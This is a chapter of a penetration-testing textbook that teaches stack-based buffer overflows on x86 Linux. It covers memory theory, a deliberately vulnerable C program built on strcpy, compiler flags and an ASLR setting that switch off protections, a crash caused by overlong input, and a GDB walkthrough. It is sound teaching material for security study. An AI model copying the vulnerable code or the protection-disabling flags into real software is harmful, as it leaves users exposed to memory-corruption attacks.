<html><head></head><body><section class="chapter" epub:type="chapter" id="stack-based_buffer_overflow_in_linux" title="Chapter&#xA0;16.&#xA0;A Stack-Based Buffer Overflow in Linux"><div class="titlepage"><div><div><h2 class="title">Chapter 16. A Stack-Based Buffer Overflow in Linux</h2></div></div></div><p><a class="indexterm" id="iddle1383"/><a class="indexterm" id="iddle1625"/><a class="indexterm" id="iddle2230"/>So far we’ve used tools such as Metasploit and public exploit code on the Internet to exploit our target systems. But you may find a vulnerability in your pentesting career that has no such exploit code, or you may discover a new security issue and want to write your own exploit code for it. In this chapter and the next three, we will look at the basics of writing our own exploits. We won’t cover everything through the latest and greatest iPhone jailbreak, but we will look at some real-world examples of vulnerable programs and learn how to write working exploits for them by hand.</p><p>We’ll begin with a simple vulnerable program on our Linux target and make the program do something its developer never intended.</p><div class="note" title="Note"><h3 class="title"><a id="ch16note01"/>Note</h3><p>All of the examples in <a class="xref" href="ch16.xhtml" title="Chapter 16. A Stack-Based Buffer Overflow in Linux">Chapter 16</a> through <a class="xref" href="ch19.xhtml" title="Chapter 19. Fuzzing, Porting Exploits, and Metasploit Modules">Chapter 19</a> use x86 architecture.</p></div><div class="sect1" title="Memory Theory"><div class="titlepage"><div><div><h2 class="title" id="memory_theory" style="clear: both">Memory Theory</h2></div></div></div><p><a class="indexterm" id="iddle1210"/><a class="indexterm" id="iddle1303"/><a class="indexterm" id="iddle1305"/><a class="indexterm" id="iddle1309"/><a class="indexterm" id="iddle1313"/><a class="indexterm" id="iddle1317"/><a class="indexterm" id="iddle1336"/><a class="indexterm" id="iddle1337"/><a class="indexterm" id="iddle1470"/><a class="indexterm" id="iddle1548"/><a class="indexterm" id="iddle1679"/><a class="indexterm" id="iddle2050"/><a class="indexterm" id="iddle2226"/><a class="indexterm" id="iddle2294"/>Before we dive into writing our own exploits, we need to get a handle on the basics of how memory works. Our goal is to manipulate memory and trick the CPU into executing instructions on our behalf. We’ll use a technique called a <span class="emphasis"><em>stack-based buffer overflow</em></span>, which involves overfilling a variable on the program’s memory stack and overwriting adjacent memory locations. But first, we need to know a little bit about how a program’s memory is laid out, as shown in <a class="xref" href="ch16.xhtml#memory_visualization" title="Figure 16-1. Memory visualization">Figure 16-1</a>.</p><div class="figure"><a id="memory_visualization"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00156"/><img alt="Memory visualization" src="httpatomoreillycomsourcenostarchimages2030502.png"/></div></div><div class="figure-title">Figure 16-1. Memory visualization</div></div><p>The <span class="emphasis"><em>text</em></span> segment contains the program code to be executed, while the <span class="emphasis"><em>data</em></span> segment contains global information for the program. At higher addresses, we have a portion shared by the stack and heap, which are allocated at runtime. The <span class="emphasis"><em>stack</em></span> is fixed in size and is used to store function arguments, local variables, and so on. The <span class="emphasis"><em>heap</em></span> holds dynamic variables. The stack consumption increases as more functions or subroutines are called, and the top of the stack points at lower memory addresses as more data is stored on the stack.</p><p>Our Intel-based CPU has general-purpose registers where it can store data for future use. These include:</p><div class="informaltable"><table style="border-collapse: collapse; border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col class="c1"/><col class="c2"/></colgroup><tbody><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p><span class="strong"><strong>EIP</strong></span></p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>instruction pointer</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p><span class="strong"><strong>ESP</strong></span></p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>stack pointer</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p><span class="strong"><strong>EBP</strong></span></p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>base pointer</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p><span class="strong"><strong>ESI</strong></span></p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>source index</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p><span class="strong"><strong>EDI</strong></span></p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>destination index</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p><span class="strong"><strong>EAX</strong></span></p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>accumulator</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p><span class="strong"><strong>EBX</strong></span></p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>base<a class="indexterm" id="iddle1154"/><a class="indexterm" id="iddle1306"/><a class="indexterm" id="iddle1312"/><a class="indexterm" id="iddle1316"/><a class="indexterm" id="iddle1318"/><a class="indexterm" id="iddle1338"/><a class="indexterm" id="iddle1949"/><a class="indexterm" id="iddle2017"/><a class="indexterm" id="iddle2067"/><a class="indexterm" id="iddle2227"/></p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p><span class="strong"><strong>ECX</strong></span></p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>counter</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; "><p><span class="strong"><strong>EDX</strong></span></p></td><td style="vertical-align: top; "><p>data</p></td></tr></tbody></table></div><p>ESP, EBP, and EIP are particularly interesting to us. ESP and EBP together keep track of the stack frame of the currently executing function.</p><p>As shown in <a class="xref" href="ch16.xhtml#stack_frame" title="Figure 16-2. Stack frame">Figure 16-2</a>, ESP points to the top of the stack frame at its lowest memory address, and likewise, EBP points to the highest memory address at the bottom of the stack frame. EIP holds the memory address of the next instruction to be executed. Because our goal is to hijack execution and make the target machine execute what we want, EIP seems like a prime target for compromise. But how do we get our instructions to EIP? EIP is read only, so we can’t just put a memory address to be executed in this register; we will need to be a bit cleverer.</p><div class="figure"><a id="stack_frame"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00157"/><img alt="Stack frame" src="httpatomoreillycomsourcenostarchimages2030504.png.jpg"/></div></div><div class="figure-title">Figure 16-2. Stack frame</div></div><p>The stack is a last-in, first-out data structure. You can think of it like a stack of lunch trays at a cafeteria. The last tray that is added to the stack is the first tray that is taken off when one is needed. To add data to the stack, a <code class="literal">PUSH</code> instruction is used. Likewise, to remove data from the stack, we use a <code class="literal">POP</code> instruction. (Remember that the stack consumption increases to lower memory addresses, so when data is pushed onto the current stack frame, ESP moves to a lower address in memory.)</p><p>When a program function is executed, a stack frame for its information (such as local variables) is pushed onto the stack. Once the function finishes executing, the entire stack frame is unwound, ESP and EBP point back to the caller function’s stack frame, and execution continues in the caller function where it left off. However, the CPU must know where in memory to continue from, and it obtains that information from the <span class="emphasis"><em>return address</em></span>, which is pushed onto the stack when a function is called.</p><p>Say, for instance, that we are running a C program. Naturally, the function <code class="literal">main</code> is called when the program begins, and a stack frame is allocated for it. <code class="literal">main</code> then calls another function, <code class="literal">function1</code>. Before pushing a stack frame for <code class="literal">function1</code> onto the stack and handing over execution, <code class="literal">main</code> notes where execution will need to continue when <code class="literal">function1</code> returns (typically the line of code directly after the call to <code class="literal">function1</code>) by pushing this value—its return address—onto the stack. <a class="xref" href="ch16.xhtml#stack_after_call_to_function1" title="Figure 16-3. Stack after call to function1">Figure 16-3</a> shows the stack after <code class="literal">main</code>’s call to <code class="literal">function1</code>.</p><div class="figure"><a id="stack_after_call_to_function1"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00158"/><img alt="Stack after call to function1" src="httpatomoreillycomsourcenostarchimages2030506.png.jpg"/></div></div><div class="figure-title">Figure 16-3. Stack after call to <code class="literal">function1</code></div></div><p><a class="indexterm" id="iddle1016"/><a class="indexterm" id="iddle1077"/><a class="indexterm" id="iddle1141"/><a class="indexterm" id="iddle1244"/><a class="indexterm" id="iddle1263"/><a class="indexterm" id="iddle2037"/>After <code class="literal">function1</code> finishes, it returns, its stack frame is unwound, and the stored return address is loaded into the EIP register to restore execution to <code class="literal">main</code>. If we can control that return address, we can dictate which instructions are executed when <code class="literal">function1</code> returns. In the next section, we’ll look at a simple stack-based buffer overflow example to illustrate this point.</p><p>Keep in mind a couple more things before we continue. In the examples in this book, we’re using older operating systems to get around some advanced antiexploitation techniques found on the most modern versions of both Windows and Linux. Particularly, we’ll take advantage of the lack of <span class="emphasis"><em>data execution prevention (DEP)</em></span> and <span class="emphasis"><em>address space layout randomization (ASLR)</em></span>, because both of them would make it difficult to learn the basics of exploitation. DEP sets specific memory sections as nonexecutable, which stops us from filling our stack with shellcode and pointing EIP to it for execution (as you’ll see in the Windows buffer overflow example in <a class="xref" href="ch17.xhtml" title="Chapter 17. A Stack-Based Buffer Overflow in Windows">Chapter 17</a>). ASLR randomizes where our libraries are loaded in memory. In our examples, we’ll hardcode the return address to where we would like to go in memory, but in the post-ASLR exploit world, finding the correct place to send execution can be a bit trickier. We’ll touch on more advanced exploit-writing techniques in <a class="xref" href="ch19.xhtml" title="Chapter 19. Fuzzing, Porting Exploits, and Metasploit Modules">Chapter 19</a>, but for now let’s get comfortable with the basics of how stack-based buffer overflows work.</p></div><div class="sect1" title="Linux Buffer Overflow"><div class="titlepage"><div><div><h2 class="title" id="linux_buffer_overflow" style="clear: both">Linux Buffer Overflow</h2></div></div></div><p>Now that we’re done with the mind-numbing theory, let’s see a basic example of a buffer overflow exploit in action on our Linux target. First, let’s make sure the target is set up correctly for a basic buffer overflow. Modern operating systems have checks in place to prevent these attacks, but while we are learning, we need to turn them off. If you’re using the Linux target image provided with this book, it’s already set up correctly, but to make sure, check that <code class="literal">randomize_va_space</code> is set to 0 as shown here.</p><a id="pro_id00191"/><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>sudo nano /proc/sys/kernel/randomize_va_space</strong></span></pre><p><a class="indexterm" id="iddle1155"/><a class="indexterm" id="iddle2231"/><code class="literal">randomize_va_space</code>, when set to 1 or 2, turns on ASLR on our target system. By default, randomization is turned on in Ubuntu, but we need this feature off for our example. If the file includes the value 0, we’re all set. If not, change the file contents to 0 and save it.</p><div class="sect2" title="A Vulnerable Program"><div class="titlepage"><div><div><h3 class="title" id="vulnerable_program">A Vulnerable Program</h3></div></div></div><p>Let’s write a simple C program called <span class="emphasis"><em>overflowtest.c</em></span> that is vulnerable to a stack-based buffer overflow, as shown in <a class="xref" href="ch16.xhtml#simple_exploitable_c_program" title="Example 16-1. Simple exploitable C program">Example 16-1</a>.</p><div class="note" title="Note"><h3 class="title"><a id="ch16note02"/>Note</h3><p>This file is in <span class="emphasis"><em>georgia’s</em></span> home directory on the Ubuntu target included in the book’s downloads.</p></div><div class="example"><a id="simple_exploitable_c_program"/><div class="example-title">Example 16-1. Simple exploitable C program</div><div class="example-contents"><pre class="programlisting">  georgia@ubuntu:~$ <span class="strong"><strong>nano overflowtest.c</strong></span>&#13;
&#13;
  #include &lt;string.h&gt;&#13;
  #include &lt;stdio.h&gt;&#13;
&#13;
❶ void overflowed() {&#13;
          printf("%s\n", "Execution Hijacked");&#13;
  }&#13;
&#13;
❷ void function1(char *str){&#13;
          char buffer[5];&#13;
          strcpy(buffer, str);&#13;
  }&#13;
❸ void main(int argc, char *argv[])&#13;
  {&#13;
          function1(argv[1]);&#13;
          printf("%s\n", "Executed normally");&#13;
  }</pre></div></div><p>Our simple C program doesn’t do very much. It starts off by including two C libraries, <code class="literal">stdio.h</code> and <code class="literal">string.h</code>. These allow us to use the standard input/output and string constructors in C without having to build them from scratch. We’ll want to use strings and output text to the console in our program.</p><p>Next we have three functions: <code class="literal">overflowed</code>, <code class="literal">function1</code>, and <code class="literal">main</code>. If <code class="literal">overflowed</code> ❶ is called, it prints the text “Execution Hijacked” to the console and then returns. If <code class="literal">function1</code> ❷ is called, it declares a local variable, a five-character string called <code class="literal">buffer</code>, and copies the contents of a variable passed to <code class="literal">function1</code> into <code class="literal">buffer</code>. Called by default when the program starts, <code class="literal">main</code> ❸ calls <code class="literal">function1</code> and passes it the first command line argument the program received. After <code class="literal">function1</code> returns, <code class="literal">main</code> prints the text “Executed normally” to the console, and the program exits.</p><p><a class="indexterm" id="iddle1153"/><a class="indexterm" id="iddle1252"/><a class="indexterm" id="iddle1434"/><a class="indexterm" id="iddle1436"/><a class="indexterm" id="iddle1446"/><a class="indexterm" id="iddle1447"/><a class="indexterm" id="iddle2232"/><a class="indexterm" id="iddle2254"/>Notice that under normal circumstances, <code class="literal">overflowed</code> is never called, so “Execution Hijacked” should never appear in the console. (You’ll learn why it’s in the program at all when we overflow the buffer and hijack control of the program.)</p><p>Now we compile our program as shown here.</p><a id="pro_id00192"/><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>gcc -g -fno-stack-protector -z execstack -o overflowtest overflowtest.c</strong></span></pre><p>To compile our C code as shown above, we use GCC, the GNU Compiler Collection, which is built into Ubuntu by default. The <code class="literal">-g</code> option tells GCC to add extra debugging information for GDB, the GNU debugger. We use the <code class="literal">-fno-stack-protector</code> flag to turn off GCC’s stack-protection mechanism, which would attempt to prevent buffer overflows if we left it turned on. The <code class="literal">-z execstack</code> compiler option makes the stack executable, disabling another buffer overflow prevention method. We tell GCC to compile <code class="literal">overflowtest.c</code> into an executable called <code class="literal">overflowtest</code> with the <code class="literal">-o</code> option.</p><p>Recall that <code class="literal">main</code> takes the first command line argument to the program and feeds it to <code class="literal">function1</code>, which copies the value into a five-character local variable. Let’s run the program with the command line argument <code class="literal">AAAA</code>, as shown here. Make <code class="literal">overflowtest</code> executable with <code class="literal">chmod</code> if necessary. We use four <span class="emphasis"><em>A</em></span>s instead of five because a string ends with a null byte. Technically, if we used five <span class="emphasis"><em>A</em></span>s, we would already be overflowing the buffer, albeit by just one character.</p><a id="pro_id00193"/><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>./overflowtest AAAA</strong></span>&#13;
Executed normally</pre><p>As shown, the program does what we expected: <code class="literal">main</code> calls <code class="literal">function1</code>, <code class="literal">function1</code> copies <code class="literal">AAAA</code> into <code class="literal">buffer</code>, <code class="literal">function1</code> returns execution to <code class="literal">main</code>, and <code class="literal">main</code> prints “Executed normally” to the console before the program exits. Maybe if we give <code class="literal">overflowtest</code> some unexpected input, we can force it to behave in a way that will help us cause a buffer overflow.</p></div><div class="sect2" title="Causing a Crash"><div class="titlepage"><div><div><h3 class="title" id="causing_a_crash">Causing a Crash</h3></div></div></div><p>Now let’s try giving the program a long string of <span class="emphasis"><em>A</em></span>s as an argument, as shown here.</p><a id="pro_id00194"/><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>./overflowtest AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</strong></span>&#13;
Segmentation fault</pre><p>This time, the program crashes with a segmentation fault. Our program’s problem lies with the implementation of <code class="literal">strcpy</code>, which we use in <code class="literal">function1</code>. The <code class="literal">strcpy</code> function takes one string and copies it into another, but it does not do any bounds checking to make sure the supplied argument will fit into the destination string variable. The <code class="literal">strcpy</code> function will attempt to copy three, five, or even hundreds of characters into our <a class="indexterm" id="iddle1438"/>five-character destination string. If our string is five characters long and we copy in 100 characters, the other 95 will end up overwriting data at adjacent memory addresses in the stack.</p><p>We could potentially overwrite the rest of <code class="literal">function1</code>’s stack frame and even higher memory. Remember what’s at the memory address immediately after the base of that stack frame? Before the frame was pushed on the stack, <code class="literal">main</code> pushed its return address onto the stack to designate where execution should continue once <code class="literal">function1</code> returns. If the string we copy into <code class="literal">buffer</code> is long enough, we’ll overwrite memory from <code class="literal">buffer</code> straight through to EBP, over the return address, and even into <code class="literal">main</code>’s stack frame.</p><p>Once <code class="literal">strcpy</code> places the first argument from <code class="literal">overflowtest</code> into <code class="literal">buffer</code>, <code class="literal">func</code><code class="literal">tion1</code> returns back to <code class="literal">main</code>. Its stack frame is popped off the stack, and the CPU tries to execute the instruction at the memory location in the return address. Because we’ve overwritten the return address with a long string of <span class="emphasis"><em>A</em></span>s, as shown in <a class="xref" href="ch16.xhtml#memory_after_strcpy_is_executed" title="Figure 16-4. Memory after strcpy is executed">Figure 16-4</a>, the CPU will try to execute the instructions at the memory address <code class="literal">41414141</code> (the hexadecimal representation of four <span class="emphasis"><em>A</em></span>s).</p><div class="figure"><a id="memory_after_strcpy_is_executed"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00159"/><img alt="Memory after strcpy is executed" src="httpatomoreillycomsourcenostarchimages2030508.png.jpg"/></div></div><div class="figure-title">Figure 16-4. Memory after <code class="literal">strcpy</code> is executed</div></div><p>However, our program can’t read, write, or execute from anywhere it likes in memory because that would cause utter chaos. The memory address <code class="literal">41414141</code> is out of bounds for our program, and it crashes with the segmentation fault we saw at the beginning of this section.</p><p>In the next section, we’ll take a closer look behind the scenes when the program crashes. In GDB, discussed next, you can use the command <code class="literal">maintenance info sections</code> to see which memory regions are mapped to the process.</p></div><div class="sect2" title="Running GDB"><div class="titlepage"><div><div><h3 class="title" id="running_gdb">Running GDB</h3></div></div></div><p>We can see exactly what’s happening in memory by running our program in a debugger. Our Ubuntu machine comes with GDB, so let’s open the program in the debugger, as shown here, and watch what happens in memory if we overflow our five-character buffer.</p><a id="pro_id00195"/><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>gdb overflowtest</strong></span>&#13;
(gdb)</pre><p><a class="indexterm" id="iddle1121"/><a class="indexterm" id="iddle1439"/><a class="indexterm" id="iddle1997"/>Before we run the program, we’ll set some <span class="emphasis"><em>breakpoints</em></span> to pause execution at certain points in the program and allow us to view the state of memory at those times. Because we compiled the program with the <code class="literal">-g</code> flag, we can view the source code directly, as shown in <a class="xref" href="ch16.xhtml#viewing_source_code_in_gdb" title="Example 16-2. Viewing source code in GDB">Example 16-2</a>, and set breakpoints at the lines where we would like to pause.</p><div class="example"><a id="viewing_source_code_in_gdb"/><div class="example-title">Example 16-2. Viewing source code in GDB</div><div class="example-contents"><pre class="programlisting">(gdb) <span class="strong"><strong>list 1,16</strong></span>&#13;
1     #include &lt;string.h&gt;&#13;
2     #include &lt;stdio.h&gt;&#13;
3&#13;
4     void overflowed() {&#13;
5          printf("%s\n", "Execution Hijacked");&#13;
6     }&#13;
7&#13;
8     void function(char *str){&#13;
9          char buffer[5];&#13;
10          strcpy(buffer, str); ❶&#13;
11      } ❷&#13;
12     void main(int argc, char *argv[])&#13;
13    {&#13;
14        function(argv[1]); ❸&#13;
15        printf("%s\n", "Executed normally");&#13;
16     }&#13;
(gdb)</pre></div></div><p>First, let’s pause the program right before <code class="literal">main</code> calls <code class="literal">function1</code> at ❸, just before the instruction is executed. We’ll also set two more breakpoints, inside <code class="literal">function1</code>, right before <code class="literal">strcpy</code> is executed at ❶, and directly afterward, at ❷.</p><p>Setting breakpoints in GDB is shown in <a class="xref" href="ch16.xhtml#setting_breakpoints_in_gdb" title="Example 16-3. Setting breakpoints in GDB">Example 16-3</a>. Set breakpoints at lines 14, 10, and 11 by using the GDB command <code class="literal">break</code>.</p><div class="example"><a id="setting_breakpoints_in_gdb"/><div class="example-title">Example 16-3. Setting breakpoints in GDB</div><div class="example-contents"><pre class="programlisting">(gdb) <span class="strong"><strong>break 14</strong></span>&#13;
Breakpoint 1 at 0x8048433: file overflowtest.c, line 14.&#13;
(gdb) <span class="strong"><strong>break 10</strong></span>&#13;
Breakpoint 2 at 0x804840e: file overflowtest.c, line 10.&#13;
(gdb) <span class="strong"><strong>break 11</strong></span>&#13;
Breakpoint 3 at 0x8048420: file overflowtest.c, line 11.&#13;
(gdb)</pre></div></div><p>Before we overflow <code class="literal">buffer</code> and cause the program to crash, let’s run it with just four <span class="emphasis"><em>A</em></span>s, as shown here, and watch memory as the program executes normally.</p><a id="pro_id00196"/><pre class="programlisting">(gdb) <span class="strong"><strong>run AAAA</strong></span>&#13;
Starting program: /home/georgia/overflowtest AAAA&#13;
Breakpoint 1, main (argc=2, argv=0xbffff5e4) at overflowtest.c:14&#13;
14        function(argv[1]);</pre><p><a class="indexterm" id="iddle1307"/><a class="indexterm" id="iddle1677"/><a class="indexterm" id="iddle2531"/>We use the GDB command <code class="literal">run</code> followed by arguments to start the program in the debugger. Here we run the program with four <span class="emphasis"><em>A</em></span>s as an argument. We hit our first breakpoint just before <code class="literal">function1</code> is called, at which time we can examine the program’s memory using the GDB command <code class="literal">x</code>.</p><p>GDB needs to know which part of memory we want to see and how it should be displayed. Memory contents can be displayed in octal, hexadecimal, decimal, or binary format. We’ll see a lot of hexadecimal in our journey through exploit development, so let’s use the <code class="literal">x</code> flag to tell GDB to display our memory in hexadecimal format.</p><p>We can also output memory in increments of one byte, a two-byte halfword, a four-byte word, and an eight-byte giant. Let’s look at 16 hexadecimal format words starting at the ESP register with the command <code class="literal">x/16xw $esp</code>, as shown in <a class="xref" href="ch16.xhtml#examining_the_contents_of_memory" title="Example 16-4. Examining the contents of memory">Example 16-4</a>.</p><div class="example"><a id="examining_the_contents_of_memory"/><div class="example-title">Example 16-4. Examining the contents of memory</div><div class="example-contents"><pre class="programlisting">(gdb) <span class="strong"><strong>x/16xw $esp</strong></span>&#13;
0xbffff540:    0xb7ff0f50    0xbffff560    0xbffff5b8    0xb7e8c685&#13;
0xbffff550:    0x08048470    0x08048340    0xbffff5b8    0xb7e8c685&#13;
0xbffff560:    0x00000002    0xbffff5e4    0xbffff5f0    0xb7fe2b38&#13;
0xbffff570:    0x00000001    0x00000001    0x00000000    0x08048249</pre></div></div><p>The <code class="literal">x/16xw $esp</code> command prints out 16 four-byte words in hexadecimal format, starting with ESP. Recall from earlier in the chapter that ESP marks the lowest memory address in our stack. Because our first breakpoint paused execution right before the call to <code class="literal">function1</code>, ESP is at the top of <code class="literal">main</code>’s stack frame.</p><p>The output of memory in GDB in <a class="xref" href="ch16.xhtml#examining_the_contents_of_memory" title="Example 16-4. Examining the contents of memory">Example 16-4</a> might be a bit confusing at first, so let’s break it down. On the far left, we have our memory addresses in 16-byte increments, followed by the contents of memory at those addresses. In this case, the first four bytes will be the contents of ESP followed by additional memory, starting at ESP and continuing down the stack.</p><p>We can find EBP, which points at the bottom (or highest address) of <code class="literal">main</code>’s stack frame, by examining EBP as shown here with the command <code class="literal">x/1xw $ebp</code>.</p><a id="pro_id00197"/><pre class="programlisting">(gdb) <span class="strong"><strong>x/1xw $ebp</strong></span>&#13;
0xbffff548:    0xbffff5b8&#13;
(gdb)</pre><p>This command allows us to examine one hexadecimal word from EBP to find the memory location and contents of the EBP register. Based on the output, <code class="literal">main</code>’s stack frame looks like this:</p><a id="pro_id00198"/><pre class="programlisting">0xbffff540:    0xb7ff0f50    0xbffff560    0xbffff5b8</pre><p>As you can see, there’s not much to it, but then again, all <code class="literal">main</code> does is call another function and then print a line of text to the screen; there’s no heavy-duty processing required.</p><p><a class="indexterm" id="iddle1122"/><a class="indexterm" id="iddle1206"/><a class="indexterm" id="iddle1274"/>Based on what we know about the stack, we can expect that when we let the program continue and <code class="literal">function1</code> is called, the return address for <code class="literal">main</code> and a stack frame for <code class="literal">function1</code> will be pushed onto the stack. Remember that the stack grows to lower memory addresses, so the top of the stack will be at a lower memory address when we hit our next breakpoint inside of <code class="literal">function1</code>. Recall that our next breakpoint is inside <code class="literal">function1</code> right before the <code class="literal">strcpy</code> command is executed. Use the command <code class="literal">continue</code> to let the program run until the next breakpoint, as shown in <a class="xref" href="ch16.xhtml#breakpoint_before_the_strcpy_command" title="Example 16-5. Breakpoint before the strcpy command">Example 16-5</a>.</p><div class="example"><a id="breakpoint_before_the_strcpy_command"/><div class="example-title">Example 16-5. Breakpoint before the <code class="literal">strcpy</code> command</div><div class="example-contents"><pre class="programlisting">(gdb) <span class="strong"><strong>continue</strong></span>&#13;
Continuing.&#13;
&#13;
Breakpoint 2, function (str=0xbffff74c "AAAA") at overflowtest.c:10&#13;
10          strcpy(buffer, str);&#13;
(gdb) <span class="strong"><strong>x/16xw $esp</strong></span>❶&#13;
0xbffff520:    0xb7f93849    0x08049ff4    0xbffff538    0x080482e8&#13;
0xbffff530:    0xb7fcfff4    0x08049ff4    0xbffff548    0x08048443&#13;
0xbffff540:    0xbffff74f    0xbffff560    0xbffff5b8    0xb7e8c685&#13;
0xbffff550:    0x08048470    0x08048340    0xbffff5b8    0xb7e8c685&#13;
(gdb) <span class="strong"><strong>x/1xw $ebp</strong></span>❷&#13;
0xbffff538:    0xbffff548</pre></div></div><p>After using the <code class="literal">continue</code> command to run the program until the next breakpoint, examine ESP at ❶ and EBP at ❷ to see the contents of <code class="literal">function1</code>’s stack frame. <code class="literal">function1</code>’s stack frame is shown here.</p><a id="pro_id00199"/><pre class="programlisting">0xbffff520:    0xb7f93849    0x08049ff4    0xbffff538    0x080482e8&#13;
0xbffff530:    0xb7fcfff4    0x08049ff4    0xbffff548</pre><p>The stack frame for <code class="literal">function1</code> is a bit larger than <code class="literal">main</code>’s. There’s some memory allocated for the local variable <code class="literal">buffer</code>, along with a little extra space for <code class="literal">strcpy</code> to work with, but there’s certainly not enough room for 30 or 40 <span class="emphasis"><em>A</em></span>s. Recall from the last breakpoint that <code class="literal">main</code>’s stack frame began at memory address <code class="literal">0xbffff540</code>. Based on our knowledge of the stack, <code class="literal">0x08048443</code>, the four-byte memory address between <code class="literal">function1</code>’s stack frame and <code class="literal">main</code>’s stack frame, should be our return address for <code class="literal">main</code>. Let’s disassemble <code class="literal">main</code> with the <code class="literal">disass</code> command, as shown in <a class="xref" href="ch16.xhtml#disassembled_main_function" title="Example 16-6. Disassembled main function">Example 16-6</a>, to see where <code class="literal">0x08048443</code> comes in.</p><div class="example"><a id="disassembled_main_function"/><div class="example-title">Example 16-6. Disassembled <code class="literal">main</code> function</div><div class="example-contents"><pre class="programlisting">(gdb) <span class="strong"><strong>disass main</strong></span>&#13;
Dump of assembler code for function main:&#13;
0x08048422 &lt;main+0&gt;:     lea    0x4(%esp),%ecx&#13;
0x08048426 &lt;main+4&gt;:     and    $0xfffffff0,%esp&#13;
0x08048429 &lt;main+7&gt;:     pushl  -0x4(%ecx)&#13;
0x0804842c &lt;main+10&gt;:    push   %ebp&#13;
0x0804842d &lt;main+11&gt;:    mov    %esp,%ebp&#13;
0x0804842f &lt;main+13&gt;:    push   %ecx&#13;
0x08048430 &lt;main+14&gt;:    sub    $0x4,%esp&#13;
0x08048433 &lt;main+17&gt;:    mov    0x4(%ecx),%eax&#13;
0x08048436 &lt;main+20&gt;:    add    $0x4,%eax&#13;
0x08048439 &lt;main+23&gt;:    mov    (%eax),%eax&#13;
0x0804843b &lt;main+25&gt;:    mov    %eax,(%esp)&#13;
0x0804843e &lt;main+28&gt;:    call   0x8048408 &lt;function1&gt; ❶&#13;
0x08048443 &lt;main+33&gt;:    movl   $0x8048533,(%esp) ❷&#13;
0x0804844a &lt;main+40&gt;:    call   0x804832c &lt;puts@plt&gt;&#13;
0x0804844f &lt;main+45&gt;:    add    $0x4,%esp&#13;
0x08048452 &lt;main+48&gt;:    pop    %ecx&#13;
0x08048453 &lt;main+49&gt;:    pop    %ebp&#13;
0x08048454 &lt;main+50&gt;:    lea    -0x4(%ecx),%esp&#13;
0x08048457 &lt;main+53&gt;:    ret&#13;
End of assembler dump.</pre></div></div><p>If you aren’t fluent in assembly code, don’t worry. The instruction we’re looking for jumps out at us in plain English: At <code class="literal">0x0804843e</code> ❶, <code class="literal">main</code> calls the memory address of <code class="literal">function1</code>. It stands to reason that the next instruction to be executed when <code class="literal">function1</code> exits (and thus our return address) will be the next instruction in the list. And sure enough, the next line at ❷ shows the return address we found on the stack. Everything looks just like the theory says it should.</p><p>Let’s allow the program to continue and see what happens in memory when our four <span class="emphasis"><em>A</em></span>s are copied into buffer. After the program pauses at the third breakpoint, examine memory in the usual way, as shown in <a class="xref" href="ch16.xhtml#examining_memory_at_breakpoint_3" title="Example 16-7. Examining memory at breakpoint 3">Example 16-7</a>.</p><div class="example"><a id="examining_memory_at_breakpoint_3"/><div class="example-title">Example 16-7. Examining memory at breakpoint 3</div><div class="example-contents"><pre class="programlisting">(gdb) <span class="strong"><strong>continue</strong></span>&#13;
Continuing.&#13;
&#13;
Breakpoint 3, function (str=0xbffff74c "AAAA") at overflowtest.c:11&#13;
11    }&#13;
(gdb) <span class="strong"><strong>x/16xw $esp</strong></span>&#13;
0xbffff520:    0xbffff533    0xbffff74c    0xbffff538    0x080482e8&#13;
0xbffff530:    0x41fcfff4    0x00414141❶   0xbffff500    0x08048443&#13;
0xbffff540:    0xbffff74c    0xbffff560    0xbffff5b8    0xb7e8c685&#13;
0xbffff550:    0x08048470    0x08048340    0xbffff5b8    0xb7e8c685&#13;
(gdb) <span class="strong"><strong>x/1xw $ebp</strong></span>&#13;
0xbffff538:    0xbffff500</pre></div></div><p>As shown, we’re still inside <code class="literal">function1</code>, so our stack frame location is the same. Inside <code class="literal">function1</code>’s stack frame, we can see our four <span class="emphasis"><em>A</em></span>s ❶ represented in hexadecimal as 41 followed by 00 for the ending null byte. They fit nicely in our five-character buffer, so our return address is still intact, and everything works as expected when we let the program continue, as shown in <a class="xref" href="ch16.xhtml#program_finishes_normallydot" title="Example 16-8. The program finishes normally.">Example 16-8</a>.</p><div class="example"><a id="program_finishes_normallydot"/><div class="example-title">Example 16-8. The program finishes normally.</div><div class="example-contents"><pre class="programlisting">(gdb) <span class="strong"><strong>continue</strong></span>&#13;
Continuing.&#13;
Executed normally&#13;
Program exited with code 022.&#13;
